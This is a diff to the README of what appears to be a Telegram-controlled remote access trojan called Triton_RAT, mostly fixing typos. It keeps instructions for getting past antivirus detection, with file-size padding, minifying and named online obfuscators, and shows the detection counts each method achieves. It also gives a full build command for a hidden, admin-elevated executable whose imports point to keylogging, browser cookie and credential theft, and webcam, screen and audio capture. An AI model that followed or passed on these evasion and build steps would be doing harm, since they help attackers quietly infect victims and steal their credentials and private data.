@@ -80,11 +80,12 @@ $ python fake_file_resizer.py
 # Without manipulations with fake_file_resizer (no obfuscated) it shows 11 detects in virustotal, but with my ip is shows only 4 detects
 # Today this is the best method of obfuscation 
 # If you want to obfuscate CODE that I'm recomending to you these 2 websites:
-# First (6 detection):https://pyob.oxyry.com/ (use this after minifiering the code ,because code's too long)
+# First (6 detection):https://pyob.oxyry.com/ (use this after minifying the code ,because code's too long)
 # Second (5 detection): https://python-minifier.com/
+# These are the best method if you don't want to use fake_file_resizer
 # Don't worry it detects by not popular antiviruses
 # First, copy the full code of Triton_RAT_Release.py then paste it in second link
-# After that, paste minified code in Triton_RAT_Release.py then build it with pyinstaller⬇️
+# After that, paste minified code in Triton_RAT_Release.py, then build it with pyinstaller⬇️
 
 # After downloading pyinstaller run:
 $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
@@ -206,7 +207,7 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 ## Antivirus check (with help of fake_file_resizer)🙂 ##
 
 ![Снимок экрана (24)](https://github.com/user-attachments/assets/715a1384-30ae-43ea-bbb2-3d4b66cb8cee)
-## Antivirus check (with help of second obfuscation(minifing) method (i wrote about that⬆️)) ##
+## Antivirus check (with help of second obfuscation(minifying) method (i wrote about that⬆️)) ##
 ![Снимок экрана (26)](https://github.com/user-attachments/assets/1e5020f4-207a-4125-81be-a98371923f02)
 
 ## Triton_Rat V2 update features: ##
